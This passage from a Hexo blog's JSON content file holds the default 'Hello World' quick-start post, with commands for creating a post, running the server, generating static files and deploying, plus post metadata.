using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","path":"2023/11/29/hello-world/","date":"11-29","excerpt":"","tags":[]}],"categories":[],"tags":[]}